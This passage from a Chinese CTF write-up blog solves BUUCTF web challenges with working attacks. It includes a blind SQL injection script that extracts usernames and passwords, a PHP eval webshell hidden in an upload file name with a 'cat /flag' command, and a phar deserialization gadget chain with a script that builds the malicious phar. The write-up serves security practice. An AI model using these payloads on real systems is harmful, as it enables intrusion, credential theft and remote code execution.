class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://3c0a9f91-d286-48a3-9bac-5dc484fbca9a.node4.buuoj.cn:81/image.php&quot;</span><br>result = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">30</span>):<br>    right = <span class="hljs-number">127</span><br>    left = <span class="hljs-number">32</span><br>    mid = (right + left)//<span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> right &gt; left:<br>        payload = <span class="hljs-string">&quot; or if(ascii(substr((select group_concat(username,password) from (users)),%d,1))&gt;%d,1,0)#&quot;</span> % (i, mid)<br>        params = &#123;<br>            <span class="hljs-string">&#x27;id&#x27;</span>: <span class="hljs-string">&#x27;\\0&#x27;</span>,<br>            <span class="hljs-string">&#x27;path&#x27;</span>: payload<br>        &#125;<br>        response = requests.get(url, params=params)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;JFIF&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>            left = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            right = mid<br>        mid = (right + left)//<span class="hljs-number">2</span><br><br>    result += <span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><p>admin  8ef403207a4691e2271b</p><p>登录：</p><p><img src="/img/ciscneastweb7.png" alt="ciscneastweb7"></p><p>直接上传<code>php</code>后缀的报错了，试试其它后缀发现<code>phtml</code>的可以：</p><p><img src="/img/ciscneasyweb8.png" alt="ciscneasyweb8"></p><p>访问<code>log/upload.19b6649eefbd2ed612b5e53d34e1a1c8.log.php</code></p><p><img src="/img/ciscneasyweb9.png" alt="ciscneasyweb9"></p><p>可以看到他只是单纯把文件名存到这个日志文件里了，真正上传到哪去了我也没找到。。</p><p>不过这个日志文件的后缀是<code>.php</code>，是不是可以直接上传一个文件名是一句话木马，然后没后缀的文件？</p><p>前面知道<code>php</code>这东西大小写都被过滤了，不过一句话还有其它写法，比如:</p><p><code>&lt;?=@eval($_POST[&#39;a&#39;]);?&gt;</code></p><p><img src="/img/ciscneasyweb10.png" alt="ciscneasyweb10"></p><p>传完了直接访问就行，不过不知道怎么回事我这个页面并没有我上传这个东西的文件名？但命令可以正常执行</p><p><img src="/img/ciscneasyweb12.png" alt="ciscneasyweb12"></p><p>POST<code>a=system(&#39;cat /flag&#39;);</code>就行</p><h2 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h2><p><img src="/img/simplephp1.png" alt="simplephp1"></p><p>唉，好像又是文件上传</p><p><img src="/img/simplephp2.png" alt="simplephp2"></p><p>源码中存在提示：<code>&lt;!--flag is in f1ag.php--&gt; </code></p><p>同时注意到<code>file.php?file=</code>这东西，想着用伪协议读读源码啥的发现读不了。。直接输进去反而有回显：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//file.php?file=index.php</span><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;base.php&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//file.php?file=base.php</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];<span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//file.php?file=file.php</span><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;function.php&#x27;</span>; <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>; <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/var/www/html/&#x27;</span>); <br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>] ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>] : <span class="hljs-string">&quot;&quot;</span>; <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file</span>)) &#123; <br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;</span>; <br>&#125; <br><span class="hljs-variable">$show</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>(); <br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file</span>)) &#123; <br>    <span class="hljs-variable">$show</span>-&gt;source = <span class="hljs-variable">$file</span>; <br>    <span class="hljs-variable">$show</span>-&gt;<span class="hljs-title function_ invoke__">_show</span>(); <br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file</span>))&#123; <br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;file doesn\&#x27;t exists.&#x27;</span>); <br>&#125; <br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//file.php?file=upload_file.php</span><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;function.php&#x27;</span>; <br><span class="hljs-title function_ invoke__">upload_file</span>(); <br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//file.php?file=function.php</span><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-comment">//show_source(__FILE__); </span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;base.php&quot;</span>; <br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type: text/html;charset=utf-8&quot;</span>); <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file_do</span>(<span class="hljs-params"></span>) </span>&#123; <br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_FILES</span>; <br>    <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>].<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]).<span class="hljs-string">&quot;.jpg&quot;</span>; <br>    <span class="hljs-comment">//mkdir(&quot;upload&quot;,0777); </span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-variable">$filename</span>)) &#123; <br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$filename</span>); <br>    &#125; <br>    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>],<span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-variable">$filename</span>); <br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;</span>; <br>&#125; <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file</span>(<span class="hljs-params"></span>) </span>&#123; <br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_FILES</span>; <br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">upload_file_check</span>()) &#123; <br>        <span class="hljs-title function_ invoke__">upload_file_do</span>(); <br>    &#125; <br>&#125; <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file_check</span>(<span class="hljs-params"></span>) </span>&#123; <br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_FILES</span>; <br>    <span class="hljs-variable">$allowed_types</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;jpeg&quot;</span>,<span class="hljs-string">&quot;jpg&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>); <br>    <span class="hljs-variable">$temp</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]); <br>    <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$temp</span>); <br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$extension</span>)) &#123; <br>        <span class="hljs-comment">//echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; </span><br>    &#125; <br>    <span class="hljs-keyword">else</span>&#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$extension</span>,<span class="hljs-variable">$allowed_types</span>)) &#123; <br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <br>        &#125; <br>        <span class="hljs-keyword">else</span> &#123; <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>; <br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <br>        &#125; <br>    &#125; <br>&#125; <br><span class="hljs-meta">?&gt;</span> <br><span class="hljs-comment">//file.php?file=class.php</span><br> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;str = <span class="hljs-variable">$name</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;test = <span class="hljs-variable language_">$this</span>-&gt;str;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;test;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;   <span class="hljs-comment">//$this-&gt;source = phar://phar.jpg</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;source;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-variable language_">$this</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]-&gt;source;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$content</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>,<span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_show</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;source);<br>        &#125;<br>        <br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker~&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;params = <span class="hljs-keyword">array</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$key</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;params[<span class="hljs-variable">$key</span>])) &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-variable language_">$this</span>-&gt;params[<span class="hljs-variable">$key</span>];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">file_get</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_get</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$text</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$value</span>));<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$text</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>注意这段代码和注释<code>//$this-&gt;source = phar://phar.jpg</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$show</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>(); <br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file</span>)) &#123; <br>    <span class="hljs-variable">$show</span>-&gt;source = <span class="hljs-variable">$file</span>; <br>    <span class="hljs-variable">$show</span>-&gt;<span class="hljs-title function_ invoke__">_show</span>(); <br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file</span>))&#123; <br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;file doesn\&#x27;t exists.&#x27;</span>); <br>&#125; <br></code></pre></td></tr></table></figure><p>注意<code>file.php</code>下有这么个东西：</p><p><code>ini_set(&#39;open_basedir&#39;,&#39;/var/www/html/&#39;); </code>结合注释<code>f1ag.php</code></p><p>目标文件<code>/var/www/html/f1ag.php</code></p><p><code>phar</code>反序列化，先写链子：</p><p>提示<code>flag</code>在<code>f1ag.php</code>中，<code>C1e4r</code>下存在<code>__destruct</code>，以这东西为起点调用<code>Show</code>下的<code>__toString</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">C1e4r</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$a</span> -&gt; str = <span class="hljs-variable">$b</span>;<span class="hljs-comment">//触发Show下的__toString方法，因为一个类被当成字符串了</span><br><span class="hljs-variable">$b</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]=<span class="hljs-variable">$c</span>;<span class="hljs-comment">//触发__get方法，因为Test底下并没有source。这时$key就是source</span><br><span class="hljs-variable">$c</span> -&gt; params = <span class="hljs-title function_ invoke__">Array</span>(<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;/var/www/html/f1ag.php&quot;</span>);<span class="hljs-comment">//注意ini_set</span><br></code></pre></td></tr></table></figure><p>生成<code>phar</code>文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>;<br><br>&#125;<br><br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">C1e4r</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$a</span> -&gt; str = <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$b</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]=<span class="hljs-variable">$c</span>;<br><span class="hljs-variable">$c</span> -&gt; params = <span class="hljs-title function_ invoke__">Array</span>(<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;/var/www/html/f1ag.php&quot;</span>);<br><br><span class="hljs-variable">$phar</span> =<span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;pharwhat.phar&quot;</span>); <br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;__HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>); <br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>生成<code>pharwhat.phar</code>，然后修改下后缀:<code>&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;</code>挑一个就行。</p><p>注意：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file_do</span>(<span class="hljs-params"></span>) </span>&#123; <br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_FILES</span>; <br>    <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>].<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]).<span class="hljs-string">&quot;.jpg&quot;</span>; <br>    <span class="hljs-comment">//mkdir(&quot;upload&quot;,0777); </span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-variable">$filename</span>)) &#123; <br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$filename</span>); <br>    &#125; <br>    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>],<span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-variable">$filename</span>); <br></code></pre></td></tr></table></figure><p>如果我们上传<code>pharwhat.jpg</code>，那么最终上传路径是：</p><p><code>upload/92f5bc75f24c46a61e46ab7b46dcb42d.jpg</code></p><p><img src="/img/simplephp18.png" alt="simplephp18"></p><p>然后base64解码就行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-comment">//$a = &#x27;flag&#123;0ad36cdc-1e96-44ed-a9cb-a5fe000473c7&#125;&#x27;;</span><br> <span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>后面看其它师傅们的<code>wp</code>时发现在生成<code>phar</code>文件时可以这么写：</p><p><code>$phar-&gt;setStub(&quot;GIF89A&lt;?php XXX __HALT_COMPILER(); ?&gt;&quot;);</code></p><p>其实就是加了个<code>GIF89A</code>欺骗头，这道题不加也能拿结果(因为并没有检测文件内容)。生成的文件内容是：</p><p><img src="/img/simplephp4.png" alt="simplephp4"></p><p>看样子以后还是加上欺骗头好一些，不加白不加。。</p><h2 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" 